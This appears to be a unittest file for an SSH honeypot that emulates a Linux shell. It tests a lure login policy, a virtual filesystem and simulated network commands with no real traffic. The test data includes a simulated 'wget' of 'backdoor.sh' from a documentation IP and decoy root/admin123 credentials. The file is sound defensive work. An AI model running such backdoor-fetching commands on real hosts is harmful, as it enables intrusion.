import os
import sys
import time
import socket
import tempfile
import shutil
import unittest
import paramiko
from typing import Dict, Any

# Ensure project in path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from honeyforge_agent.traps.fake_ssh import FakeSSHTrap, VirtualFS, FSEntry, HoneySSHInterface

class TestFakeSSHRealism(unittest.TestCase):

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        os.environ["PERSISTENT_DATA_DIR"] = self.temp_dir
        os.environ["SSH_KEYS_DIR"] = os.path.join(self.temp_dir, "keys")
        self.events = []
        self.sessions = []

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def _event_cb(self, ev):
        self.events.append(ev)

    def _session_cb(self, sess):
        self.sessions.append(sess)

    def test_01_persona_and_persistent_boot_time(self):
        """Item 1: Persona generation, persistent boot time, and dynamic real-time uptime"""
        trap = FakeSSHTrap(
            port=2222,
            event_callback=self._event_cb,
            session_callback=self._session_cb,
            trap_id="trap-node-01"
        )
        self.assertTrue(trap.persona["hostname"].startswith(("srv-", "corp-", "int-", "dc-", "prod-", "mon-")))
        self.assertTrue(trap.persona["mac"].startswith("02:42:"))
        self.assertIn("5.15.0", trap.persona["kernel"])
        
        # Verify boot time persistence
        btime_1 = trap.boot_time
        trap2 = FakeSSHTrap(
            port=2222,
            event_callback=self._event_cb,
            session_callback=self._session_cb,
            trap_id="trap-node-01"
        )
        self.assertEqual(trap2.boot_time, btime_1)

        # Verify dynamic uptime progression
        vfs = VirtualFS(trap.persona, "trap-node-01", trap.boot_time)
        out1, _, _, _ = trap._emulate_command_core("uptime", "127.0.0.1", "s1", "root", "/root", vfs, 0, [])
        time.sleep(1.05)
        out2, _, _, _ = trap._emulate_command_core("uptime", "127.0.0.1", "s1", "root", "/root", vfs, 0, [])
        # Both outputs are valid uptime strings
        self.assertIn("load average:", out1)
        self.assertIn("load average:", out2)

        # Verify /proc/uptime dynamic progression
        proc_up1, _, _, _ = trap._emulate_command_core("cat /proc/uptime", "127.0.0.1", "s1", "root", "/root", vfs, 0, [])
        time.sleep(0.5)
        proc_up2, _, _, _ = trap._emulate_command_core("cat /proc/uptime", "127.0.0.1", "s1", "root", "/root", vfs, 0, [])
        val1 = float(proc_up1.split()[0])
        val2 = float(proc_up2.split()[0])
        self.assertGreater(val2, val1)

    def test_02_persistent_host_keys_and_security_options(self):
        """Item 2: Persistent RSA, ECDSA, Ed25519 host keys and OpenSSH 8.9 ciphers"""
        trap = FakeSSHTrap(
            port=2222,
            event_callback=self._event_cb,
            session_callback=self._session_cb,
            trap_id="trap-node-02"
        )
        self.assertEqual(len(trap.host_keys), 3)
        key_names = [k.get_name() for k in trap.host_keys]
        self.assertIn("ssh-rsa", key_names)
        self.assertIn("ecdsa-sha2-nistp256", key_names)
        self.assertIn("ssh-ed25519", key_names)

        # Verify re-use of host keys from disk
        trap2 = FakeSSHTrap(
            port=2222,
            event_callback=self._event_cb,
            session_callback=self._session_cb,
            trap_id="trap-node-02"
        )
        self.assertEqual(trap.host_keys[0].asbytes(), trap2.host_keys[0].asbytes())
        self.assertEqual(trap.host_keys[1].asbytes(), trap2.host_keys[1].asbytes())
        self.assertEqual(trap.host_keys[2].asbytes(), trap2.host_keys[2].asbytes())

        # Verify security options
        s1, s2 = socket.socketpair()
        try:
            t = paramiko.Transport(s1)
            trap._configure_security_options(t)
            sec = t.get_security_options()
            self.assertIn("aes128-ctr", sec.ciphers)
            self.assertIn("aes256-gcm@openssh.com", sec.ciphers)
            self.assertIn("curve25519-sha256@libssh.org", sec.kex)
            self.assertIn("hmac-sha2-256-etm@openssh.com", sec.digests)
            self.assertIn("ssh-ed25519", sec.key_types)
        finally:
            s1.close()
            s2.close()

    def test_03_lure_policy(self):
        """Item 3: Lure policy: reject 1st attempt with weak pass; admit on 2nd attempt; reject wrong pass"""
        auth_events = []
        def auth_cb(u, p, success, reason=""):
            auth_events.append({"user": u, "pass": p, "success": success, "reason": reason})

        srv = HoneySSHInterface(
            auth_callback=auth_cb,
            decoy_creds=[{"user": "root", "pass": "admin123"}],
            max_attempts=3,
            client_ip="192.168.1.50"
        )

        # Attempt 1: Valid weak password MUST be rejected by lure policy
        res1 = srv.check_auth_password("root", "admin123")
        self.assertEqual(res1, paramiko.AUTH_FAILED)
        self.assertEqual(srv.auth_attempts, 1)
        self.assertEqual(auth_events[-1]["reason"], "lure_first_attempt_rejection")
        self.assertFalse(auth_events[-1]["success"])

        # Attempt 2: Same valid weak password on retry MUST be accepted
        res2 = srv.check_auth_password("root", "admin123")
        self.assertEqual(res2, paramiko.AUTH_SUCCESSFUL)
        self.assertEqual(srv.auth_attempts, 2)
        self.assertEqual(auth_events[-1]["reason"], "decoy_accepted")
        self.assertTrue(auth_events[-1]["success"])

        # Attempt with strong / wrong password MUST be rejected
        srv2 = HoneySSHInterface(
            auth_callback=auth_cb,
            decoy_creds=[{"user": "root", "pass": "admin123"}],
            max_attempts=3,
            client_ip="192.168.1.51"
        )
        res_wrong = srv2.check_auth_password("root", "superSecureP@ssw0rd!2026")
        self.assertEqual(res_wrong, paramiko.AUTH_FAILED)
        self.assertEqual(auth_events[-1]["reason"], "invalid_password")

    def test_04_virtual_fs_and_mutations(self):
        """Item 5: Structured virtual filesystem entries, permissions, and mutations"""
        persona = {
            "hostname": "test-srv",
            "kernel": "5.15.0-89-generic",
            "users": ["root", "deploy", "ubuntu"]
        }
        vfs = VirtualFS(persona, "t1", time.time() - 100000)
        self.assertTrue(vfs.exists("/etc/passwd"))
        self.assertTrue(vfs.exists("/etc/shadow"))
        self.assertTrue(vfs.exists("/var/log/auth.log"))

        # File creation via write_file & touch
        vfs.write_file("/tmp/hello.txt", "Hello World\n", mode=0o644)
        self.assertTrue(vfs.exists("/tmp/hello.txt"))
        self.assertEqual(vfs.get("/tmp/hello.txt").content, "Hello World\n")

        # Directory creation via mkdir
        vfs.mkdir("/opt/myapp/bin", parents=True)
        self.assertTrue(vfs.is_dir("/opt/myapp/bin"))

        # Copy & Move
        vfs.copy("/tmp/hello.txt", "/opt/myapp/bin/hello.txt")
        self.assertTrue(vfs.exists("/opt/myapp/bin/hello.txt"))
        vfs.move("/opt/myapp/bin/hello.txt", "/opt/myapp/bin/renamed.txt")
        self.assertFalse(vfs.exists("/opt/myapp/bin/hello.txt"))
        self.assertTrue(vfs.exists("/opt/myapp/bin/renamed.txt"))

        # Remove
        vfs.remove("/opt/myapp/bin/renamed.txt")
        self.assertFalse(vfs.exists("/opt/myapp/bin/renamed.txt"))

    def test_05_coreutils_command_emulation_and_gnu_errors(self):
        """Item 4: Command execution with authentic GNU layout and error messages"""
        trap = FakeSSHTrap(
            port=2222,
            event_callback=self._event_cb,
            session_callback=self._session_cb,
            trap_id="trap-test-coreutils"
        )
        vfs = VirtualFS(trap.persona, "trap-test-coreutils", trap.boot_time)

        # ls long format
        out_ls, _, _, _, code_ls = trap._execute_command_vfs("ls -la /etc", "127.0.0.1", "s1", "root", "/root", vfs, 0, [])
        self.assertEqual(code_ls, 0)
        self.assertIn("total", out_ls)
        self.assertIn("-rw-r--r--", out_ls)
        self.assertIn("passwd", out_ls)

        # cat existing and missing
        out_cat, _, _, _, code_cat = trap._execute_command_vfs("cat /etc/hostname", "127.0.0.1", "s1", "root", "/root", vfs, 0, [])
        self.assertEqual(code_cat, 0)
        self.assertIn(trap.persona["hostname"], out_cat)

        out_cat_err, _, _, _, code_cat_err = trap._execute_command_vfs("cat /nonexistent.conf", "127.0.0.1", "s1", "root", "/root", vfs, 0, [])
        self.assertEqual(code_cat_err, 1)
        self.assertEqual(out_cat_err, "cat: /nonexistent.conf: No such file or directory\n")

        # cd into directory vs file vs non-existent
        _, _, _, new_dir, code_cd = trap._execute_command_vfs("cd /var/log", "127.0.0.1", "s1", "root", "/root", vfs, 0, [])
        self.assertEqual(code_cd, 0)
        self.assertEqual(new_dir, "/var/log")

        out_cd_f, _, _, _, code_cd_f = trap._execute_command_vfs("cd /etc/passwd", "127.0.0.1", "s1", "root", "/root", vfs, 0, [])
        self.assertEqual(code_cd_f, 1)
        self.assertIn("Not a directory", out_cd_f)

        out_cd_none, _, _, _, code_cd_none = trap._execute_command_vfs("cd /ghost_folder", "127.0.0.1", "s1", "root", "/root", vfs, 0, [])
        self.assertEqual(code_cd_none, 1)
        self.assertIn("No such file or directory", out_cd_none)

        # command not found
        out_bad, _, _, _, code_bad = trap._execute_command_vfs("unknown_evil_cmd", "127.0.0.1", "s1", "root", "/root", vfs, 0, [])
        self.assertEqual(code_bad, 127)
        self.assertEqual(out_bad, "bash: unknown_evil_cmd: command not found\n")

        # exit code inspection ($?)
        out_code, _, _, _, _ = trap._execute_command_vfs("echo $?", "127.0.0.1", "s1", "root", "/root", vfs, 127, [])
        self.assertEqual(out_code.strip(), "127")

    def test_06_simulated_network_and_zero_egress(self):
        """Item 6: Simulated wget, curl, ping, nc with artifact hashing and zero egress"""
        trap = FakeSSHTrap(
            port=2222,
            event_callback=self._event_cb,
            session_callback=self._session_cb,
            trap_id="trap-test-net"
        )
        vfs = VirtualFS(trap.persona, "trap-test-net", trap.boot_time)

        # wget simulation
        out_wget, is_dl, sha, _, code_wget = trap._execute_command_vfs(
            "wget http://198.51.100.99/backdoor.sh", "127.0.0.1", "s1", "root", "/root", vfs, 0, []
        )
        self.assertEqual(code_wget, 0)
        self.assertTrue(is_dl)
        self.assertEqual(len(sha), 64)
        self.assertTrue(vfs.exists("/root/backdoor.sh"))
        self.assertIn("200 OK", out_wget)
        self.assertIn("backdoor.sh", out_wget)

        # ping simulation
        out_ping, _, _, _, code_ping = trap._execute_command_vfs("ping 8.8.8.8", "127.0.0.1", "s1", "root", "/root", vfs, 0, [])
        self.assertEqual(code_ping, 0)
        self.assertIn("64 bytes from 8.8.8.8", out_ping)
        self.assertIn("0% packet loss", out_ping)

if __name__ == "__main__":
    unittest.main()
